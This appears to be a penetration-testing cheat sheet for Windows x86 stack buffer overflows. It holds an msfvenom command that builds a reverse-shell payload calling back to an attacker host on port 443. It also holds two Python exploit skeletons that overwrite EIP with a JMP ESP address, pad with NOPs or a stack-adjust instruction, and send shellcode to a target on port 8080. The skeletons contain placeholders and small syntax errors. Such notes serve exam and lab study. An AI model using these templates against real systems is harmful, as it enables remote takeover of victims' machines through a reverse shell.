# Windows Stack Buffer Overflow

## Stack Buffer Overflow

## x86 Stack Buffer Overflow

### x86 Msfvenom Template

```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.20 LPORT=443 -b "\x00" -e x86/shikata_ga_naiÂ -f c EXITFUNC=thread
```

### x86 Stack Buffer Overflow Skeleton

#### NOP Skeleton

```python
#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time

from pwn import *
from struct import pack

# Global
target = 10.10.10.10

def exploit():
    # Shellcode in Bytes
    shellcode = (b"<shellcode>")

    # Payload in Bytes
    offset = 1052
    before_eip = b"A"*offset # 1052 A
    eip = pack("<I", <address>) # JMP ESP
    nops = "\x90"*16 # 16 NOPs
    
    payload = before_eip + eip + nops + shellcode
    
    # Socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 8080)) # Connect to the target on port 8080
    s.send(payload) # Send the payload
    
    
    
if __name__ == "__main__"
    exploit()
```

#### Stack Slide Skeleton \(Alternative to NOPs\)

```python
#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time

from pwn import *
from struct import pack

# Global
target = 10.10.10.10

def exploit():
    # Shellcode in Bytes
    shellcode = (b"<shellcode>")

    # Payload in Bytes
    offset = 1052
    before_eip = b"A"*offset # 1052 A
    eip = pack("<I", <address>) # JMP ESP
    # SUB ESP, 0x10
    payload = before_eip + eip + b"\x83\xec\x10" + shellcode
    
    # Socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 8080)) # Connect to the target on port 8080
    s.send(payload) # Send the payload
    
    
    
if __name__ == "__main__"
    exploit()
```

